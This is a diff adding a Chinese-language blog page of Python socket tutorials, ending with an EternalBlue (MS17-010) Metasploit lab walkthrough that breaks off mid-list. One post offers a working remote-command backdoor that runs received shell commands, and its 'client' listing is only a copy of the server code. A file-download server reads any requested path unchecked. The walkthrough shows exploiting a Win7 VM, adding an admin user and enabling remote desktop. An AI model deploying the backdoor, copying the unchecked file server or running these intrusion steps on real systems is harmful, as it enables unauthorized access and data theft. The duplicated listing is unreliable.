+      <a data-url="http://example.com/2023/02/08/udpliaotianshi/" data-id="clech12oj0004v0uzchid84b4" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-xiaoxunlei" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/02/08/xiaoxunlei/" class="article-date">
+  <time datetime="2023-02-08T14:59:49.000Z" itemprop="datePublished">2023-02-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/02/08/xiaoxunlei/">小迅雷</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="一、Socket"><a href="#一、Socket" class="headerlink" title="一、Socket"></a>一、Socket</h3><p>Socket又称”套接字”，应用程序通常通过”套接字”向网络发出请求或者应答网络请求，使主机间或者一台计算机上的进程间可以通讯。</p>
+<h3 id="二、源代码"><a href="#二、源代码" class="headerlink" title="二、源代码"></a>二、源代码</h3><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    tcp_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    dest_ip=<span class="built_in">input</span>(<span class="string">&quot;输入服务器ip:&quot;</span>)</span><br><span class="line">    dest_port=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;输入端口:&quot;</span>))</span><br><span class="line">    tcp_socket.connect((dest_ip,dest_port))</span><br><span class="line"></span><br><span class="line">    down_file_name=<span class="built_in">input</span>(<span class="string">&quot;请输入下载文件名:&quot;</span>)</span><br><span class="line">    <span class="comment">#把文件名发给服务器</span></span><br><span class="line">    tcp_socket.send(down_file_name.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    <span class="comment">#接收下载文件</span></span><br><span class="line">    recv_data=tcp_socket.recv(<span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">    <span class="comment">#保存文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;new_&quot;</span>+down_file_name,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(recv_data)</span><br><span class="line">    tcp_socket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h4 id="服务器端"><a href="#服务器端" class="headerlink" title="服务器端"></a>服务器端</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_file_2_client</span>(<span class="params">new_client_socket,client_addr</span>):</span><br><span class="line">    <span class="comment">#客户端要下载的文件名</span></span><br><span class="line">    file_name=new_client_socket.recv(<span class="number">1024</span>).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;客户端 %s 要下载 %s&quot;</span>%(<span class="built_in">str</span>(client_addr),file_name))</span><br><span class="line">    <span class="comment">#按照客户端要求读取文件</span></span><br><span class="line">    file_content=<span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f =<span class="built_in">open</span>(file_name,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">        file_content=f.read()</span><br><span class="line">        f.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;没有要下载的文件&quot;</span>,file_name)</span><br><span class="line">    <span class="comment">#读取出来就发送给客户</span></span><br><span class="line">    <span class="keyword">if</span> file_content:</span><br><span class="line">        new_client_socket.send(file_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    tcp_server_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    tcp_server_socket.bind((<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">7788</span>))</span><br><span class="line">    tcp_server_socket.listen(<span class="number">100</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        new_client_socket,client_addr=tcp_server_socket.accept()</span><br><span class="line">        <span class="comment">#调用发送文件的函数</span></span><br><span class="line">        send_file_2_client(new_client_socket,client_addr)</span><br><span class="line">        new_client_socket.close()</span><br><span class="line">    tcp_server_socket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h3 id="三、演示过程"><a href="#三、演示过程" class="headerlink" title="三、演示过程"></a>三、演示过程</h3><ol>
+<li>先运行服务器端</li>
+<li>运行客户机端输入服务器信息</li>
+</ol>
+<p><img src="/img/xiaoxunlei/image-20230208230608455.png" alt="image-20230208230608455"></p>
+<ol start="3">
+<li>下一步输入下载文件名</li>
+</ol>
+<p><img src="/img/xiaoxunlei/image-20230208230641884.png" alt="image-20230208230641884"></p>
+<ol start="4">
+<li>下载完成的文件存储另存为new_123.png</li>
+</ol>
+<p><img src="/img/xiaoxunlei/image-20230208230807839.png" alt="image-20230208230807839"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/02/08/xiaoxunlei/" data-id="clech12ok0005v0uza8kd54nh" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-yuanchengkongzhi" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/02/08/yuanchengkongzhi/" class="article-date">
+  <time datetime="2023-02-07T16:50:15.000Z" itemprop="datePublished">2023-02-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/02/08/yuanchengkongzhi/">远程控制程序</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>python编写的远程控制程序，使用socket进行网络连接，获取操作系统命令控制（shell）</p>
+<h2 id="二、源代码"><a href="#二、源代码" class="headerlink" title="二、源代码"></a>二、源代码</h2><p>服务端</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    host=gethostname</span><br><span class="line">    port=<span class="number">12345</span></span><br><span class="line">    s.bind((host,port))</span><br><span class="line">    s.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        c,addr=s.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;连接地址&quot;</span>,addr)</span><br><span class="line">        c.send(<span class="string">&quot;欢迎&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                recv_data=c.recv(<span class="number">1024</span>).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> recv_data ==<span class="string">&#x27;cmd&#x27;</span>:</span><br><span class="line">                    c.send(<span class="string">&quot;ok cmd&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                        <span class="comment">#循环接收发来的cmd命令</span></span><br><span class="line">                        data=c.recv(<span class="number">1024</span>)</span><br><span class="line">                        recv_data2=data.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">                        <span class="keyword">if</span> recv_data2==<span class="string">&#x27;exit&#x27;</span>:</span><br><span class="line">                            c.send(<span class="string">&quot;ok cmd stop&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="comment">#执行发送的cmd命令,并且读取命令执行结果</span></span><br><span class="line">                            x=os.popen(recv_data2).read()</span><br><span class="line">                            <span class="comment">#并把命令回显发送回去</span></span><br><span class="line">                            c.send(x.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(e)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        c.close()</span><br><span class="line">    s.close()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>客户端</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    host=<span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">    port=<span class="number">12345</span></span><br><span class="line">    s.bind((host,port))</span><br><span class="line">    s.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        c,addr=s.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;连接地址&quot;</span>,addr)</span><br><span class="line">        c.send(<span class="string">&quot;欢迎&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                recv_data=c.recv(<span class="number">1024</span>).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> recv_data ==<span class="string">&#x27;cmd&#x27;</span>:</span><br><span class="line">                    c.send(<span class="string">&quot;ok cmd&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                        <span class="comment">#循环接收发来的cmd命令</span></span><br><span class="line">                        data=c.recv(<span class="number">1024</span>)</span><br><span class="line">                        recv_data2=data.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">                        <span class="keyword">if</span> recv_data2==<span class="string">&#x27;exit&#x27;</span>:</span><br><span class="line">                            c.send(<span class="string">&quot;ok cmd stop&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="comment">#执行发送的cmd命令,并且读取命令执行结果</span></span><br><span class="line">                            x=os.popen(recv_data2).read()</span><br><span class="line">                            <span class="comment">#并把命令回显发送回去</span></span><br><span class="line">                            c.send(x.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(e)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        c.close()</span><br><span class="line">    s.close()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="演示过程"><a href="#演示过程" class="headerlink" title="演示过程"></a>演示过程</h3><ol>
+<li>连接到被入侵端</li>
+</ol>
+<p><img src="/img/yuanchengkongzhi/image-20230208005557098.png" alt="image-20230208005557098"></p>
+<ol start="2">
+<li>输入cmd</li>
+</ol>
+<p><img src="/img/yuanchengkongzhi/image-20230208005624207.png" alt="image-20230208005624207"></p>
+<ol start="3">
+<li>输入whoami</li>
+</ol>
+<p><img src="/img/yuanchengkongzhi/image-20230208005847936.png" alt="image-20230208005847936"></p>
+<ol start="4">
+<li>查看当前进程</li>
+</ol>
+<p><img src="/img/yuanchengkongzhi/image-20230208005953678.png" alt="image-20230208005953678"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/02/08/yuanchengkongzhi/" data-id="clech12om0007v0uzd4ho52zn" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-processliaotianruanjian" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/02/04/processliaotianruanjian/" class="article-date">
+  <time datetime="2023-02-04T14:35:43.000Z" itemprop="datePublished">2023-02-04</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/02/04/processliaotianruanjian/">python进程池聊天软件</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="什么是socket"><a href="#什么是socket" class="headerlink" title="什么是socket"></a>什么是socket</h3><p>Socket又称”套接字”，应用程序通常通过”套接字”向网络发出请求或者应答网络请求，使主机间或者一台计算机上的进程间可以通讯。</p>
+<h3 id="服务器端代码"><a href="#服务器端代码" class="headerlink" title="服务器端代码"></a>服务器端代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#服务端程序</span></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#实例化socket</span></span><br><span class="line"><span class="comment">#AF_INET表示网络层使用ip协议</span></span><br><span class="line"><span class="comment">#SOCK_STREAM表示socket传输层使用tcp协议</span></span><br><span class="line">server =socket(AF_INET,SOCK_STREAM)</span><br><span class="line"><span class="comment">#当socket被关闭后，立刻重新使用端口</span></span><br><span class="line">server.setsockopt(SOL_SOCKET,SO_REUSEADDR,<span class="number">1</span>)</span><br><span class="line"><span class="comment">#绑定地址和端口</span></span><br><span class="line">server.bind((<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">8080</span>))</span><br><span class="line"><span class="comment">#使socket处于监听状态，等待客户端的连接请求</span></span><br><span class="line">server.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">talk</span>(<span class="params">conn,addr</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;进程%s 用户%s&quot;</span>%(os.getpid(),addr))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            msg=conn.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="comment">#如果客户端传来的数据为空break掉</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> msg:<span class="keyword">break</span></span><br><span class="line">            conn.send(msg.upper())</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    p =Pool(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        conn,addr=server.accept()</span><br><span class="line">        p.apply_async(talk,args=(conn,addr,))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h3 id="客户端代码"><a href="#客户端代码" class="headerlink" title="客户端代码"></a>客户端代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#客户端程序</span></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#实例化socket</span></span><br><span class="line"><span class="comment">#AF_INET表示网络层使用ip协议</span></span><br><span class="line"><span class="comment">#SOCK_STREAM表示socket传输层使用tcp协议</span></span><br><span class="line">client=socket(AF_INET,SOCK_STREAM)</span><br><span class="line"><span class="comment">#绑定地址和端口</span></span><br><span class="line">client.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">8080</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        msg=<span class="built_in">input</span>(<span class="string">&quot;&gt;&gt;: &quot;</span>).strip()<span class="comment">#如果输入换行/空格去掉</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> msg:<span class="keyword">continue</span></span><br><span class="line">        client.send(msg.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">        msg=client.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="built_in">print</span>(msg.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>在项目根目录下使用cmd打开server.py文件</p>
+<p>进入监听模式</p>
+<p><img src="/img/processliaotianruanjian/image-20230205115446303.png" alt="image-20230205115446303"></p>
+<p>在项目根目录下使用cmd打开client.py文件</p>
+<p>可以通信</p>
+<p><img src="/img/processliaotianruanjian/image-20230205115725385.png" alt="image-20230205115725385"></p>
+<p>当打开多个文件时,进程池被占用完用户5会处于等待状态</p>
+<p><img src="/img/processliaotianruanjian/image-20230205120140158.png" alt="image-20230205120140158"></p>
+<p>用户1结束,释放进程用户5连接</p>
+<p><img src="/img/processliaotianruanjian/image-20230205120310750.png" alt="image-20230205120310750"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/02/04/processliaotianruanjian/" data-id="clech12oi0003v0uz06q5enha" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-yonghengzhilan" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/01/31/yonghengzhilan/" class="article-date">
+  <time datetime="2023-01-31T13:15:50.000Z" itemprop="datePublished">2023-01-31</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/01/31/yonghengzhilan/">永恒之蓝木马复现</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="一、永恒之蓝的介绍"><a href="#一、永恒之蓝的介绍" class="headerlink" title="一、永恒之蓝的介绍"></a>一、永恒之蓝的介绍</h3><p>永恒之蓝是指2017年4月14日晚，黑客团体Shadow Brokers（影子经纪人）公布一大批网络攻击工具，其中包含“永恒之蓝”工具，“永恒之蓝”利用Windows系统的SMB漏洞可以获取系统最高权限。5月12日，不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件。</p>
+<h3 id="二、漏洞描述"><a href="#二、漏洞描述" class="headerlink" title="二、漏洞描述"></a>二、漏洞描述</h3><p>恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
+<p>本次黑客使用的是Petya勒索病毒的变种Petwarp，攻击时仍然使用了永恒之蓝勒索漏洞，并会获取系统用户名与密码进行内网传播。</p>
+<p>本次爆发使用了已知OFFICE漏洞、永恒之蓝SMB漏洞、局域网感染等网络自我复制技术，使得病毒可以在短时间内呈爆发态势。同时，该病毒与普通勒索病毒不同，其不会对电脑中的每个文件都进行加密，而是通过加密硬盘驱动器主文件表(MFT)，使主引导记录(MBR)不可操作，通过占用物理磁盘上的文件名，大小和位置的信息来限制对完整系统的访问，从而让电脑无法启动，相较普通勒索病毒对系统更具破坏性。</p>
+<h3 id="三、MSF介绍"><a href="#三、MSF介绍" class="headerlink" title="三、MSF介绍"></a>三、MSF介绍</h3><p>Metasploit Framework(MSF)是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新。Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程，被安全社区冠以“可以黑掉整个宇宙”之名。刚开始的Metasploit是采用Perl语言编写的，但是再后来的新版中，改成了用Ruby语言编写的了，此工具在kali中是自带的。</p>
+<h3 id="四、漏洞复现"><a href="#四、漏洞复现" class="headerlink" title="四、漏洞复现"></a>四、漏洞复现</h3><ol>
+<li>复现环境</li>
+</ol>
+<p>​    win7（192.168.8.146）（实验前将防火墙彻底关闭）</p>
+<p>​    win10（192.168.8.8）后续攻击使用</p>
+<p>​    kali（192.168.8.145）</p>
+<ol start="2">
+<li>先使用nmap对目标机进行扫描，查看其445端口是否开启</li>
+</ol>
+<p><img src="/img/yonghengzhilan/image-20230131212303381.png" alt="image-20230131212303381"></p>
+<ol start="3">
+<li>在终端输入msfconsole进入MSF</li>
+</ol>
+<p><img src="/img/yonghengzhilan/image-20230131212342981.png" alt="image-20230131212342981"></p>
+<ol start="4">
+<li>使用msf中的查找命令搜索关于永恒之蓝的脚本：search ms17—010</li>
+</ol>
+<p>​        其中：auxiliary为辅助模块脚本；exploit为攻击模块脚本。</p>
+<p><img src="/img/yonghengzhilan/image-20230131212508203.png" alt="image-20230131212508203"></p>
+<ol start="5">
+<li>使用ms17-010辅助模块</li>
+</ol>
+<p>​        使用模块 use 粘贴模块</p>
+<p><img src="/img/yonghengzhilan/image-20230131212608097.png" alt="image-20230131212608097"></p>
+<ol start="6">
+<li>配置ms17-010的辅助性脚本</li>
+</ol>
+<p>​        查看配置：show options</p>
+<p><img src="/img/yonghengzhilan/image-20230131212635276.png" alt="image-20230131212635276"></p>
+<ol start="7">
+<li>配置目标机IP地址：set RHOST +目标机ip</li>
+</ol>
+<p><img src="/img/yonghengzhilan/image-20230131212711871.png" alt="image-20230131212711871"></p>
+<ol start="8">
+<li>配置成功后，执行ms17-010的辅助性脚本run #运行模块</li>
+</ol>
+<p><img src="/img/yonghengzhilan/image-20230131212732119.png" alt="image-20230131212732119"></p>
+<ol start="9">
+<li>使用ms17-010攻击模块</li>
+</ol>
+<p>​        使用模块 use 粘贴模块</p>
+<p><img src="/img/yonghengzhilan/image-20230131212753631.png" alt="image-20230131212753631"></p>
+<ol start="10">
+<li>查看配置项</li>
+</ol>
+<p>​        查看配置：show options</p>
+<p><img src="/img/yonghengzhilan/image-20230131212818176.png" alt="image-20230131212818176"></p>
+<ol start="11">
+<li>设置被攻击机的ip地址：set RHOST +目标机ip</li>
+</ol>
+<p><img src="/img/yonghengzhilan/image-20230131212852120.png" alt="image-20230131212852120"></p>
+<ol start="12">
+<li>运行ms17-010攻击模块</li>
+</ol>
+<p><img src="/img/yonghengzhilan/image-20230131212909872.png" alt="image-20230131212909872"></p>
+<ol start="13">
+<li>成功建立会话后，使用一些功能shell</li>
+</ol>
+<p>​        在此处可对目标机使用dos命令进行操作</p>
+<p>​        使用exit可退出win7终端</p>
+<ol start="14">
+<li>入侵成功后</li>
+</ol>
+<p>​        开启远程终端：需要双终端操作</p>
+<p>​        在shell中，新建一个用户,将其加入管理员组</p>
+<p><img src="/img/yonghengzhilan/image-20230131213005792.png" alt="image-20230131213005792"></p>
+<p><img src="/img/yonghengzhilan/image-20230131213018961.png" alt="image-20230131213018961"></p>
+<p>在meterpreter下使用run getgui -e，试目标机打开允许被远程连接</p>
+<p><img src="/img/yonghengzhilan/image-20230131213044391.png" alt="image-20230131213044391"></p>
+<p><img src="/img/yonghengzhilan/image-20230131213106156.png" alt="image-20230131213106156"></p>
+<p>用win10进行远控</p>
+<p><img src="/img/yonghengzhilan/image-20230131213147612.png" alt="image-20230131213147612"></p>
+<ul>
+<li><p>在meterpreter下进行进一步实验</p>
+</li>
+<li><p>查看靶机相关进程信息：ps</p>
+</li>
+</ul>
+<p><img src="/img/yonghengzhilan/image-20230131213420410.png" alt="image-20230131213420410"></p>
+<ul>
